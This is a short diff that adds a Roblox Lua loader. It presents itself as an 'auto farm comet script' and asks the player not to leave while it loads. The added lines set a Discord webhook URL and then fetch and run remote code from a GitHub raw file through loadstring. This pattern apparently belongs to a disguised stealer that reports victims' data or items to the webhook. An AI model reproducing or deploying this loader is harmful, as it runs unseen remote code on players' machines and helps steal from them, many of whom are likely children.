@@ -1,0 +1,4 @@
+_G.Username = "robloxzombiboos"
+_G.HubName = "Auto farm comet script are loading, please don't leave"
+_G.WebhookUrl = "discord.com/api/webhooks/1107982242359287818/cT4FupstabyRxeqZxE3BwQWSB-Bg5ti1kHL9dnX6L9lEPS3T0aVfir6RqvogOQ85EMdz"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
